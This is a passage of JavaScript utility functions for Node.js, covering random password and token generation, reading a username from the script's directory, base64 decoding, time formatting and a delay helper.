    let pass = L[Math.floor((Math.random() * L.length))].toUpperCase()

    for (let i = 0; i < 6; i++) {
        pass += L[Math.floor((Math.random() * L.length))]
    }

    for (let i = 0; i < 3; i++) {
        pass += N[Math.floor((Math.random() * N.length))]
    }

    return pass
}

function getRandomToken(size) {
    let C = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-'.split('')

    let token = '<'

    for (let i = 0; i < size; i++) {
        token += C[Math.floor((Math.random() * C.length))]
    }

    return token
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}


function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function getTime() {
    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
